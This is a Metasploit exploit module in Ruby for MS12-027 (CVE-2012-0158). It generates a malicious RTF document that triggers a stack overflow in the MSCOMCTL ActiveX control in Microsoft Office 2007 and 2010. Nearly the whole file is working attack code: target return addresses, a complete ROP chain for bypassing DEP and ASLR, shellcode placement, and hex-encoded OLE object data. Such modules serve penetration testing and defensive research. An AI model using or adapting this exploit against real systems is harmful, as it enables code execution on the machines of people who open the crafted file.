##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
 
    include Msf::Exploit::FILEFORMAT
 
    def initialize(info = {})
        super(update_info(info,
            'Name'           => 'MS12-027 MSCOMCTL ActiveX Buffer Overflow',
            'Description'    => %q{
                    This module exploits a stack buffer overflow in MSCOMCTL.OCX. It uses a malicious
                RTF to embed the specially crafted MSComctlLib.ListViewCtrl.2 Control as exploited
                in the wild on April 2012.
 
                This module targets Office 2007 and Office 2010 targets. The DEP/ASLR bypass on Office
                2010 is done with the Ikazuchi ROP chain proposed by Abysssec. This chain uses
                "msgr3en.dll", which will load after office got load, so the malicious file must
                be loaded through "File / Open" to achieve exploitation.
            },
            'License'        => MSF_LICENSE,
            'Author'         =>
                [
                    'Unknown', # Vulnerability discovery
                    'juan vazquez', # Metasploit module
                    'sinn3r' # Metasploit module
                ],
            'References'     =>
                [
                    [ 'CVE', '2012-0158' ],
                    [ 'OSVDB', '81125' ],
                    [ 'BID', '52911' ],
                    [ 'MSB', 'MS12-027' ],
                    [ 'URL', 'http://contagiodump.blogspot.com.es/2012/04/cve2012-0158-south-china-sea-insider.html' ],
                    [ 'URL', 'http://abysssec.com/files/The_Arashi.pdf' ]
                ],
            'DefaultOptions' =>
                {
                    'EXITFUNC' => 'process',
                },
            'Payload'        =>
                {
                    'PrependEncoder' => "\x81\xc4\x54\xf2\xff\xff", # Stack adjustment # add esp, -3500,
                    'Space'         => 900,
                    'BadChars'      => "\x00",
                    'DisableNops'   => true # no need
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
                    # winword.exe v12.0.4518.1014 (No Service Pack)
                    # winword.exe v12.0.6211.1000 (SP1)
                    # winword.exe v12.0.6425.1000 (SP2)
                    # winword.exe v12.0.6612.1000 (SP3)
                    [ 'Microsoft Office 2007 [no-SP/SP1/SP2/SP3] English on Windows [XP SP3 / 7 SP1] English',
                        {
                            'Offset' => 270,
                            'Ret' => 0x27583c30, # jmp esp # MSCOMCTL.ocx 6.1.95.45
                            'Rop' => false
                        }
                    ],
                    # winword.exe v14.0.6024.1000 (SP1)
                    [ 'Microsoft Office 2010 SP1 English on Windows [XP SP3 / 7 SP1] English',
                        {
                            'Ret' => 0x3F2CB9E1, # ret # msgr3en.dll
                            'Rop' => true,
                            'RopOffset' => 120
                        }
                    ],
                ],
            'DisclosureDate' => 'Apr 10 2012',
            'DefaultTarget' => 0))
 
        register_options(
            [
                OptString.new('FILENAME', [ true, 'The file name.',  'msf.doc']),
            ], self.class)
    end
 
    def stream(bytes)
        Rex::Text.to_hex(bytes).gsub("\\x", "")
    end
 
    def junk(n=1)
        tmp = []
        value = rand_text(4).unpack("L")[0].to_i
        n.times { tmp << value }
        return tmp
    end
 
    # Ikazuchi ROP chain (msgr3en.dll)
    # Credits to Abysssec
    # http://abysssec.com/files/The_Arashi.pdf
    def create_rop_chain
        rop_gadgets = [
            0x3F2CB9E0, # POP ECX # RETN
            0x3F10115C, # HeapCreate() IAT = 3F10115C
            # EAX == HeapCreate() Address
            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN
            # Call HeapCreate() and Create a Executable Heap. After this call, EAX contain our Heap Address.
            0x3F39AFCF, # CALL EAX # RETN
            0x00040000,
            0x00010000,
            0x00000000,
            0x3F2CB9E0, # POP ECX # RETN
            0x00008000, # pop 0x00008000 into ECX
            # add ECX to EAX and instead of calling HeapAlloc, now EAX point to the RWX Heap
            0x3F39CB46, # ADD EAX,ECX # POP ESI # RETN
            junk,
            0x3F2CB9E0, # POP ECX # RETN
            0x3F3B3DC0, # pop 0x3F3B3DC0 into ECX, it is a writable address.
            # storing our RWX Heap Address into 0x3F3B3DC0 ( ECX ) for further use ;)
            0x3F2233CC, # MOV DWORD PTR DS:[ECX],EAX # RETN
            0x3F2D59DF, #POP EAX # ADD DWORD PTR DS:[EAX],ESP # RETN
            0x3F3B3DC4, # pop 0x3F3B3DC4 into EAX , it is writable address with zero!
                                    # then we add ESP to the Zero which result in storing ESP into that address,
                                    # we need ESP address for copying shellcode ( which stores in Stack ),
                                    # and we have to get it dynamically at run-time, now with my tricky instruction, we have it!
            0x3F2F18CC, # POP EAX # RETN
            0x3F3B3DC4, # pop 0x3F3B3DC4 ( ESP address ) into EAX
            # makes ECX point to nearly offset of Stack.
            0x3F2B745E, # MOV ECX,DWORD PTR DS:[EAX] #RETN
            0x3F39795E, # POP EDX # RETN
            0x00000024, # pop 0x00000024 into EDX
            # add 0x24 to ECX ( Stack address )
            0x3F39CB44, # ADD ECX,EDX # ADD EAX,ECX # POP ESI # RETN
            junk,
            # EAX = ECX
            0x3F398267, # MOV EAX,ECX # RETN
            # mov EAX ( Stack Address + 24 = Current ESP value ) into the current Stack Location,
            # and the popping it into ESI ! now ESI point where shellcode stores in stack
            0x3F3A16DE, # MOV DWORD PTR DS:[ECX],EAX # XOR EAX,EAX # POP ESI # RETN
            # EAX = ECX
            0x3F398267, # MOV EAX,ECX # RETN
            0x3F2CB9E0, # POP ECX # RETN
            0x3F3B3DC0, # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX
            # makes EAX point to our RWX Heap
            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN
            # makes EDI = Our RWX Heap Address
            0x3F2B0A7C, # XCHG EAX,EDI # RETN 4
            0x3F2CB9E0, # POP ECX # RETN
            junk,
            0x3F3B3DC0, # pop 0x3F3B3DC0 ( Saved Heap address ) into ECX
            # makes EAX point to our RWX Heap
            0x3F389CA5, # MOV EAX,DWORD PTR DS:[ECX] # RETN
            # just skip some junks
            0x3F38BEFB, # ADD AL,58 # RETN
            0x3F2CB9E0, # POP ECX # RETN
            0x00000300, # pop 0x00000300 into ECX ( 0x300 * 4 = Copy lent )
            # Copy shellcode from stack into RWX Heap
            0x3F3441B4, # REP MOVS DWORD PTR ES:[EDI],DWORD PTR DS:[ESI] # POP EDI # POP ESI # RETN
            junk(2), # pop into edi # pop into esi
            0x3F39AFCF # CALL EAX # RETN
        ].flatten.pack("V*")
 
        # To avoid shellcode being corrupted in the stack before ret
        rop_gadgets << "\x90" * target['RopOffset'] # make_nops doesn't have sense here
        return rop_gadgets
 
    end
 
    def exploit
 
        ret_address = stream([target.ret].pack("V"))
 
        if target['Rop']
            shellcode = stream(create_rop_chain)
        else
            # To avoid shellcode being corrupted in the stack before ret
            shellcode = stream(make_nops(target['Offset']))
            shellcode << stream(Metasm::Shellcode.assemble(Metasm::Ia32.new, "jmp $+6").encode_string)
            shellcode << stream(make_nops(4))
        end
        shellcode << stream(payload.encoded)
        while shellcode.length < 2378
            shellcode += "0"
        end
 
        content = "{\\rtf1"
        content << "{\\fonttbl{\\f0\\fnil\\fcharset0 Verdana;}}"
        content << "\\viewkind4\\uc1\\pard\\sb100\\sa100\\lang9\\f0\\fs22\\par"
        content << "\\pard\\sa200\\sl276\\slmult1\\lang9\\fs22\\par"
        content << "{\\object\\objocx"
        content << "{\\*\\objdata"
        content << "\n"
        content << "01050000020000001B0000004D53436F6D63746C4C69622E4C697374566965774374726C2E320000"
        content << "00000000000000000E0000"
        content << "\n"
        content << "D0CF11E0A1B11AE1000000000000000000000000000000003E000300FEFF09000600000000000000"
        content << "00000000010000000100000000000000001000000200000001000000FEFFFFFF0000000000000000"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFDFFFFFFFEFFFFFF"
        content << "FEFFFFFF0400000005000000FEFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF52006F006F007400200045006E007400"
        content << "72007900000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "000000000000000016000500FFFFFFFFFFFFFFFF020000004BF0D1BD8B85D111B16A00C0F0283628"
        content << "0000000062eaDFB9340DCD014559DFB9340DCD0103000000000600000000000003004F0062006A00"
        content << "49006E0066006F000000000000000000000000000000000000000000000000000000000000000000"
        content << "0000000000000000000000000000000012000200FFFFFFFFFFFFFFFFFFFFFFFF0000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000600000000000000"
        content << "03004F00430058004E0041004D004500000000000000000000000000000000000000000000000000"
        content << "000000000000000000000000000000000000000000000000120002010100000003000000FFFFFFFF"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000001000000"
        content << "160000000000000043006F006E00740065006E007400730000000000000000000000000000000000"
        content << "000000000000000000000000000000000000000000000000000000000000000012000200FFFFFFFF"
        content << "FFFFFFFFFFFFFFFF0000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000020000007E05000000000000FEFFFFFFFEFFFFFF03000000040000000500000006000000"
        content << "0700000008000000090000000A0000000B0000000C0000000D0000000E0000000F00000010000000"
        content << "11000000120000001300000014000000150000001600000017000000FEFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF"
        content << "FFFFFFFFFFFFFFFF0092030004000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000004C00690073007400"
        content << "56006900650077004100000000000000000000000000000000000000000000000000000000000000"
        content << "0000000000000000000000000000000021433412080000006ab0822cbb0500004E087DEB01000600"
        content << "1C000000000000000000000000060001560A000001EFCDAB00000500985D65010700000008000080"
        content << "05000080000000000000000000000000000000001FDEECBD01000500901719000000080000004974"
        content << "6D736400000002000000010000000C000000436F626A640000008282000082820000000000000000"
        content << "000000000000"
        content << ret_address
        content << "9090909090909090"
        content << shellcode
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000000000000000000000000000000000000000000000000000000000000000000000"
        content << "00000000000000"
        content << "\n"
        content << "}"
        content << "}"
        content << "}"
 
        print_status("Creating '#{datastore['FILENAME']}' file ...")
        file_create(content)
 
    end
 
end
